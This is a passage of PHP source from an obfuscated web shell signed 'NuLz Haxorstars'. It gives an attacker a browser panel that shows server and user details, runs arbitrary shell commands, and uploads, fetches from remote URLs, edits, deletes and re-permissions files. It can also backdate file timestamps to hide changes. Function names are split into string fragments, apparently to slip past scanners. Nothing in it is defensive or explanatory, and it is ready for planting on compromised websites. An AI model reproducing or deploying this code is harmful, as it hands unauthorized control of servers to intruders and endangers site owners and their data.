                    <span class="nb-info-label"><?= 'S' . 'ER' . 'V' . 'ER' ?></span>
                    <span class="nb-info-value"><?= NuLzUname(); ?></span>
                </div>
                <div class="nb-info-row">
                    <span class="nb-info-label"><?= 'USER' ?></span>
                    <span class="nb-info-value">uid=<?= $uid ?>(<?= $user ?>) gid=<?= $gid ?>(<?= $group ?>)</span>
                </div>
                <div class="nb-info-row">
                    <span class="nb-info-label">IP</span>
                    <span class="nb-info-value"><?= serverIp(); ?> <span class="nb-bold">|</span> <?= userIp(); ?></span>
                </div>
                <div class="nb-info-row">
                    <span class="nb-info-label"><?= 'D' . 'IS' . 'ABL' . 'E FN' ?></span>
                    <span class="nb-info-value"><?= $cekFunc ?></span>
                </div>
                <div class="nb-info-row">
                    <span class="nb-info-label"><?= 'SO' . 'FT' . 'WA' . 'RE' ?></span>
                    <span class="nb-info-value"><span class="nb-tag nb-tag-blue"><?= $_SERVER['SERVER_SOFTWARE'] ?></span></span>
                </div>
            </div>
        </div>

        <!-- PATH -->
        <div class="nb-path">
            <?php
            $pa_t_hs = explode("/", $lokasi);
            echo '<i class="fa-solid fa-folder-open"></i> ';
            echo '<a href="?lokasinya=/">/</a>';
            foreach ($pa_t_hs as $id => $pat) {
                echo "<a href='?lokasinya=";
                for ($i = 0; $i <= $id; $i++) {
                    echo $pa_t_hs[$i];
                    if ($i != $id) echo '/';
                }
                echo "'>$pat</a><span class='nb-sep'>/</span>";
            }
            echo "<a href='" . $_SERVER['PHP_SELF'] . "' class='nb-home-btn'>Home</a>";
            ?>
        </div>

        <!-- TOOLS -->
        <div class="nb-tools">
            <div class="nb-upload-area">
                <form action="" method="post" id="form-upload" enctype="multipart/form-data">
                    <label for="nulzup" class="nb-upload-label">
                        <i class="fa-solid fa-cloud-arrow-up"></i><?= 'UP' . 'LO' . 'AD F' . 'IL' . 'E' ?>
                    </label>
                    <input type="file" name="nulzup[]" id="nulzup" multiple>
                </form>
            </div>

            <form action="" method="post" id="form-tools">
                <div class="nb-tool-panel" id="panel-newfile">
                    <input type="text" name="newfiles" id="newfiles" placeholder="NewFile.txt">
                    <button type="button" id="btn-newfiles" class="nb-btn nb-btn-green">Create File</button>
                </div>
                <div class="nb-tool-panel" id="panel-newdir">
                    <input type="text" name="newdirs" id="newdirs" placeholder="NewFolder">
                    <button type="button" id="btn-newdirs" class="nb-btn nb-btn-orange">Create Folder</button>
                </div>
                <div class="nb-tool-panel" id="panel-remote">
                    <input type="text" name="fileurl" id="fileurl" placeholder="https://url.com/file.txt">
                    <input type="text" name="savename" id="savename" placeholder="saved.txt">
                    <button type="button" id="btn-upload-remote" class="nb-btn nb-btn-purple" style="margin-top:6px;">Upload</button>
                </div>

                <div class="nb-terminal">
                    <div class="nb-terminal-input">
                        <input type="text" name="command" id="command" placeholder="$ type command...">
                        <button type="submit" name="btn-command" id="btn-command" value="submit" class="nb-btn nb-btn-black">RUN</button>
                    </div>
                    <?php
                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                        if (isset($_POST['btn-command']) && $_POST['btn-command']) {
                            $cmd = $_POST['command'];
                            ?>
                            <textarea rows="18" readonly><?= NuLzCmd($cmd) ?></textarea>
                            <?php
                        }
                    }
                    ?>
                </div>

                <div class="nb-btn-row">
                    <button type="button" class="nb-btn nb-btn-green" id="btn-news-file"><i class="fa-solid fa-file-circle-plus"></i> New File</button>
                    <button type="button" class="nb-btn nb-btn-orange" id="btn-news-dir"><i class="fa-solid fa-folder-plus"></i> New Dir</button>
                    <button type="button" class="nb-btn nb-btn-purple" id="btn-remote-upload"><i class="fa-solid fa-download"></i> Remote</button>
                </div>
            </form>
        </div>

        <!-- FILE MANAGER -->
        <?php
        function createFile($filename, $filecontent)
        {
            global $func_exist, $fo, $fw, $fc, $f_put, $tch;
            if (empty($filename)) return false;
            if ($func_exist($fo)) {
                $h = $fo($filename, 'w');
                if ($h === false) {
                    $r = $f_put($filename, $filecontent);
                    if ($r === false) { $r2 = $tch($filename); return ($r2 !== false); }
                    return true;
                } else {
                    $result = $fw($h, $filecontent);
                    $fc($h);
                    return ($result !== false);
                }
            } elseif ($func_exist($f_put)) {
                return ($f_put($filename, "") !== false);
            }
        }
        function renameItem($oldName, $newName)
        {
            global $lokasi;
            $oldPath = $lokasi . '/' . $oldName;
            $newPath = $lokasi . '/' . $newName;
            if (!file_exists($oldPath) || file_exists($newPath)) return false;
            return rename($oldPath, $newPath);
        }
        function deleteDir($dirName)
        {
            global $f_exist, $is_d, $unl, $rm_d, $scn_d;
            if (!$f_exist($dirName)) return false;
            $files = $scn_d($dirName);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $fullPath = $dirName . '/' . $file;
                if ($is_d($fullPath)) deleteDir($fullPath);
                else $unl($fullPath);
            }
            $rm_d($dirName);
            return true;
        }
        function deleteFile($fileName)
        {
            global $f_exist, $unl;
            return $f_exist($fileName) ? $unl($fileName) : false;
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (isset($_FILES["nulzup"])) {
                $countFiles = count($_FILES["nulzup"]["name"]);
                for ($i = 0; $i < $countFiles; $i++) {
                    $fi_le_Na_me = $_FILES["nulzup"]["name"][$i];
                    $location = "" . $fi_le_Na_me;
                    if (NuLzUploadFile($_FILES["nulzup"]["tmp_name"][$i], $location)) {
                        echo '<div class="nb-alert-ok"><i class="fa-solid fa-check"></i> File <a href="' . $fi_le_Na_me . '" target="_blank"><b>' . $fi_le_Na_me . '</b></a> Uploaded!</div>';
                    } else {
                        echo '<div class="nb-alert-err"><i class="fa-solid fa-xmark"></i> File <b>' . $fi_le_Na_me . '</b> Upload Failed!</div>';
                    }
                }
            }
            if (isset($_POST['action']) && $_POST['action'] === 'newfiles' && isset($_POST['fileName'])) {
                $fileName = $_POST['fileName'];
                echo createFile($fileName, '') ? '<script>alert("File ' . $fileName . ' Created.")</script>' : '<script>alert("Failed To Create ' . $fileName . '")</script>';
            }
            if (isset($_POST['action']) && $_POST['action'] === 'newdirs' && isset($_POST['dirName'])) {
                $dirName = $_POST['dirName'];
                echo $cr_ea_teF_old_er($dirName) ? '<script>alert("Folder ' . $dirName . ' Created.")</script>' : '<script>alert("Failed To Create ' . $dirName . '")</script>';
            }
            if (isset($_POST['action']) && $_POST['action'] === 'remote-upload' && isset($_POST['fileUrl']) && isset($_POST['saveName'])) {
                $fileUrl = $_POST['fileUrl'];
                $saveName = $_POST['saveName'];
                $filecontent = '';
                if ($func_exist($f_get)) $filecontent = $f_get($fileUrl);
                elseif ($func_exist('curl_init')) $filecontent = NuLzCurl($fileUrl);
                if (!empty($fileUrl) && !empty($saveName) && $filecontent !== false) createFile($saveName, $filecontent);
            }
            if (isset($_POST['savefile'])) {
                $fileName = $_POST['filename'];
                $filePath = $lokasi . '/' . $fileName;
                $fileContent = $_POST['filecontent'];
                echo NuLzSaveFile($filePath, $fileContent) ? '<script>alert("File Saved.")</script>' : '<script>alert("File Failed To Save.")</script>';
            }
            if (isset($_POST['editfile'])) {
                $fileName = $_POST['file'];
                $filePath = $lokasi . '/' . $fileName;
                if (file_exists($filePath)) {
                    $filecontent = $hayoloh(NuLzReadFile($filePath));
                    echo '
                    <form action="" method="post">
                        <div class="nb-modal">
                            <div class="nb-modal-content">
                                <span class="close-modal">&times;</span>
                                <p class="nb-modal-title">Edit File</p>
                                <span class="nb-modal-path">' . $filePath . '</span>
                                <p style="margin-bottom:12px;">Permission: ';
                    if ($is_w("$filePath")) echo '<span class="nb-perm-w">';
                    elseif (!$is_r("$filePath")) echo '<span class="nb-perm-r">';
                    else echo '<span class="nb-perm">';
                    echo NuLzPerms("$filePath");
                    echo '</span></p>
                                <button type="submit" name="savefile" class="nb-btn nb-btn-green" style="margin-bottom:12px;"><i class="fa-solid fa-floppy-disk"></i> Save File</button>
                                <textarea id="filecontent" name="filecontent" rows="25" wrap="soft" spellcheck="false">' . $filecontent . '</textarea>
                                <input type="hidden" name="filename" value="' . $fileName . '">
                            </div>
                        </div>
                    </form>';
                } else {
                    echo '<script>alert("Failed To Read This File")</script>';
                }
            }
            if (isset($_POST['action']) && $_POST['action'] === 'rename' && isset($_POST['oldName']) && isset($_POST['newName'])) {
                echo renameItem($_POST['oldName'], $_POST['newName']) ? '<script>alert("Rename Success")</script>' : '<script>alert("Rename Failed")</script>';
            }
            if (isset($_POST['action']) && $_POST['action'] === 'changedate' && isset($_POST['itemName']) && isset($_POST['oldDate']) && isset($_POST['newDate'])) {
                $newDate = $_POST['newDate'];
                $itemName = $_POST['itemName'];
                if ($str_time($newDate) !== false) {
                    echo $tch($itemName, $str_time($newDate)) ? '<script>alert("Date Changed")</script>' : '<script>alert("Failed Change Date")</script>';
                } else { echo '<script>alert("Invalid Date Format")</script>'; }
            }
            if (isset($_POST['action']) && $_POST['action'] === 'permission' && isset($_POST['itemName']) && isset($_POST['oldPerm']) && isset($_POST['newPerm'])) {
                $item = $lokasi . '/' . $_POST['itemName'];
                $chperms = 'c' . 'h' . 'm' . 'o' . 'd';
                $oct = 'o' . 'c' . 't' . 'd' . 'e' . 'c';
                echo $chperms($item, $oct($_POST['newPerm'])) ? '<script>alert("Permission Changed")</script>' : '<script>alert("Failed Change Permission")</script>';
            }
            if (isset($_POST['action']) && $_POST['action'] === 'delete' && isset($_POST['folderName'])) {
                $folderPath = $lokasi . '/' . $_POST['folderName'];
                echo deleteDir($folderPath) ? '<script>alert("Delete Success")</script>' : '<script>alert("Delete Failed")</script>';
            }
            if (isset($_POST['action']) && $_POST['action'] === 'delete' && isset($_POST['fileName'])) {
                $filePath = $lokasi . '/' . $_POST['fileName'];
                echo deleteFile($filePath) ? '<script>alert("Delete Success")</script>' : '<script>alert("Delete Failed")</script>';
            }
        }
        ?>

        <div class="nb-table-wrap">
            <?php $scan = $scn_d($lokasi); ?>
            <table>
                <thead>
                    <tr>
                        <th style="text-align:left;">Name</th>
                        <th>Modified</th>
                        <th>Size</th>
                        <th>Owner</th>
                        <th>Permission</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="text-align:left;">
                            <a href="?lokasinya=<?= dirname($lokasi) ?>" class="nb-folder-name"><i class="fa-solid fa-folder-open"></i> ..</a>
                        </td>
                        <td class="nb-date">--</td>
                        <td>--</td>
                        <td>--</td>
                        <td>--</td>
                        <td>--</td>
                    </tr>
                    <?php
                    foreach ($scan as $dir) {
                        if (!is_dir("$lokasi/$dir") || $dir == '.' || $dir == '..') continue;
                        if ($func_exist($psx_usr_uid)) { $d_owner = @$psx_usr_uid($own_f("$lokasi/$dir")); $d_owner = $d_owner['name']; }
                        else { $d_owner = $own_f("$lokasi/$dir"); }
                        if ($func_exist($psx_grp_gid)) { $d_group = @$psx_grp_gid($grp_f("$lokasi/$dir")); $d_group = $d_group['name']; }
                        else { $d_group = $grp_f("$lokasi/$dir"); }
                        echo '<tr>';
                        echo '<td style="text-align:left;"><a href="?lokasinya=' . $lokasi . '/' . $dir . '" class="nb-folder-name"><i class="fa-solid fa-folder"></i> ' . $dir . '</a></td>';
                        echo '<td class="nb-date">' . date('Y-m-d H:i', filemtime($lokasi . '/' . $dir)) . '</td>';
                        echo '<td><span class="nb-dir-badge">DIR</span></td>';
                        echo '<td class="nb-owner">' . $d_owner . '/' . $d_group . '</td>';
                        echo '<td>';
                        if ($is_w("$lokasi/$dir")) echo '<span class="nb-perm-w">';
                        elseif (!$is_r("$lokasi/$dir")) echo '<span class="nb-perm-r">';
                        else echo '<span class="nb-perm">';
                        echo NuLzPerms("$lokasi/$dir") . '</span></td>';
                        echo '<td><div class="nb-actions">';
                        echo '<button type="button" class="nb-actions-toggle"><i class="fa-solid fa-ellipsis-vertical"></i></button>';
                        echo '<div class="nb-dropdown">';
                        echo '<button type="button" class="nb-drop-item act-rename rename" data-name="' . $dir . '"><span class="nb-di-icon"><i class="fa-solid fa-pen"></i></span>Rename</button>';
                        echo '<button type="button" class="nb-drop-item act-date changedate" data-date="' . date('Y-m-d H:i:s', $f_time($lokasi . '/' . $dir)) . '" data-name="' . $dir . '"><span class="nb-di-icon"><i class="fa-solid fa-calendar"></i></span>Change Date</button>';
                        echo '<button type="button" class="nb-drop-item act-perm permission" data-perm="' . ChangePerms($dir) . '" data-name="' . $dir . '"><span class="nb-di-icon"><i class="fa-solid fa-key"></i></span>Permission</button>';
                        echo '<button type="button" class="nb-drop-item act-delete deleteFolder" data-name="' . $dir . '"><span class="nb-di-icon"><i class="fa-solid fa-trash"></i></span>Delete</button>';
                        echo '</div></div></td>';
                        echo '</tr>';
                    }
                    foreach ($scan as $file) {
                        $f_size = 'f' . 'il' . 'es' . 'iz' . 'e';
                        if (!$is_f("$lokasi/$file")) continue;
                        $size = $f_size("$lokasi/$file") / 1024;
                        $size = $rnd($size, 3);
                        if ($size >= 1024) $size = $rnd($size / 1024, 2) . ' MB';
                        else $size = $size . ' KB';
                        if ($func_exist($psx_usr_uid)) { $f_owner = @$psx_usr_uid($own_f("$lokasi/$file")); $f_owner = $f_owner['name']; }
                        else { $f_owner = $own_f("$lokasi/$file"); }
                        if ($func_exist($psx_grp_gid)) { $f_group = @$psx_grp_gid($grp_f("$lokasi/$file")); $f_group = $f_group['name']; }
                        else { $f_group = $grp_f("$lokasi/$file"); }
                        echo '<tr>';
                        echo '<td style="text-align:left;"><form action="" method="post" style="display:inline;"><button type="submit" name="editfile" class="nb-file-name" style="background:none;border:none;cursor:pointer;font-family:var(--font);font-size:12px;padding:0;color:var(--black);"><i class="fa-regular fa-file"></i> ' . $file . '</button><input type="hidden" name="file" value="' . $file . '"></form></td>';
                        echo '<td class="nb-date">' . date('Y-m-d H:i', filemtime($lokasi . '/' . $file)) . '</td>';
                        echo '<td class="nb-size">' . $size . '</td>';
                        echo '<td class="nb-owner">' . $f_owner . '/' . $f_group . '</td>';
                        echo '<td>';
                        if ($is_w("$lokasi/$file")) echo '<span class="nb-perm-w">';
                        elseif (!$is_r("$lokasi/$file")) echo '<span class="nb-perm-r">';
                        else echo '<span class="nb-perm">';
                        echo NuLzPerms("$lokasi/$file") . '</span></td>';
                        echo '<td><div class="nb-actions">';
                        echo '<button type="button" class="nb-actions-toggle"><i class="fa-solid fa-ellipsis-vertical"></i></button>';
                        echo '<div class="nb-dropdown">';
                        echo '<form action="" method="post"><button type="submit" name="editfile" class="nb-drop-item act-edit"><span class="nb-di-icon"><i class="fa-solid fa-file-pen"></i></span>Edit File</button><input type="hidden" name="file" value="' . $file . '"></form>';
                        echo '<button type="button" class="nb-drop-item act-rename rename" data-name="' . $file . '"><span class="nb-di-icon"><i class="fa-solid fa-pen"></i></span>Rename</button>';
                        echo '<button type="button" class="nb-drop-item act-date changedate" data-date="' . date('Y-m-d H:i:s', $f_time($lokasi . '/' . $file)) . '" data-name="' . $file . '"><span class="nb-di-icon"><i class="fa-solid fa-calendar"></i></span>Change Date</button>';
                        echo '<button type="button" class="nb-drop-item act-perm permission" data-perm="' . ChangePerms($file) . '" data-name="' . $file . '"><span class="nb-di-icon"><i class="fa-solid fa-key"></i></span>Permission</button>';
                        echo '<button type="button" class="nb-drop-item act-delete deleteFile" data-name="' . $file . '"><span class="nb-di-icon"><i class="fa-solid fa-trash"></i></span>Delete</button>';
                        echo '</div></div></td>';
                        echo '</tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <!-- FOOTER -->
        <div class="nb-footer">
            &#9760; Copyright 1945 - <?= date('Y') ?> - NuLz Haxorstars &#9760;
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    $(document).ready(function(){

        // DROPDOWN
        $(document).on('click', '.nb-actions-toggle', function(e){
            e.stopPropagation();
            var $p = $(this).closest('.nb-actions');
            var wasOpen = $p.hasClass('open');
            $('.nb-actions').removeClass('open');
            if(!wasOpen){
                $p.addClass('open');
                var $dd = $p.find('.nb-dropdown');
                var ddRight = $p.offset().left + $dd.outerWidth();
                if(ddRight > $(window).width()) $dd.css({'right':'0','left':'auto'});
                var ddBot = $p.offset().top + $p.outerHeight() + $dd.outerHeight();
                if(ddBot > $(window).scrollTop() + $(window).height()) $dd.css({'bottom':'calc(100% + 5px)','top':'auto'});
            }
        });
        $(document).on('click', function(){ $('.nb-actions').removeClass('open'); });

        // UPLOAD
        $('#nulzup').on('change', function(){ $('#form-upload').submit(); });

        // PANELS
        $('#btn-news-file').on('click', function(){
            $('#panel-newfile').toggleClass('active');
            $('#panel-newdir, #panel-remote').removeClass('active');
        });
        $('#btn-news-dir').on('click', function(){
            $('#panel-newdir').toggleClass('active');
            $('#panel-newfile, #panel-remote').removeClass('active');
        });
        $('#btn-remote-upload').on('click', function(){
            $('#panel-remote').toggleClass('active');
            $('#panel-newfile, #panel-newdir').removeClass('active');
        });

        // CREATE
        $('#btn-newfiles').on('click', function(){
            var n = $('#newfiles').val();
            if(n) $.post('', {action:'newfiles', fileName:n}, function(){ location.reload(); });
        });
        $('#btn-newdirs').on('click', function(){
            var n = $('#newdirs').val();
            if(n) $.post('', {action:'newdirs', dirName:n}, function(){ location.reload(); });
        });
        $('#btn-upload-remote').on('click', function(){
            var u = $('#fileurl').val(), s = $('#savename').val();
            if(u && s) $.post('', {action:'remote-upload', fileUrl:u, saveName:s}, function(){ location.reload(); });
        });

        // ACTIONS
        $(document).on('click', '.rename', function(){
            var old = $(this).data('name');
            var nw = prompt('Rename "'+old+'" to:', old);
            if(nw && nw !== old) $.post('', {action:'rename', oldName:old, newName:nw}, function(){ location.reload(); });
        });
        $(document).on('click', '.changedate', function(){
            var name = $(this).data('name'), old = $(this).data('date');
            var nw = prompt('Change date for "'+name+'":\nCurrent: '+old+'\nFormat: Y-m-d H:i:s', old);
            if(nw && nw !== old) $.post('', {action:'changedate', itemName:name, oldDate:old, newDate:nw}, function(){ location.reload(); });
        });
        $(document).on('click', '.permission', function(){
            var name = $(this).data('name'), old = $(this).data('perm');
            var nw = prompt('Permission for "'+name+'":\nCurrent: '+old+'\nNew (e.g. 0755):', old);
            if(nw && nw !== old) $.post('', {action:'permission', itemName:name, oldPerm:old, newPerm:nw}, function(){ location.reload(); });
        });
        $(document).on('click', '.deleteFolder', function(){
            var n = $(this).data('name');
            if(confirm('Delete folder "'+n+'" ?')) $.post('', {action:'delete', folderName:n}, function(){ location.reload(); });
        });
        $(document).on('click', '.deleteFile', function(){
            var n = $(this).data('name');
            if(confirm('Delete file "'+n+'" ?')) $.post('', {action:'delete', fileName:n}, function(){ location.reload(); });
        });

        // MODAL
        $(document).on('click', '.close-modal', function(){ $(this).closest('.nb-modal').hide(); });
    });
    </script>
</body>
</html>
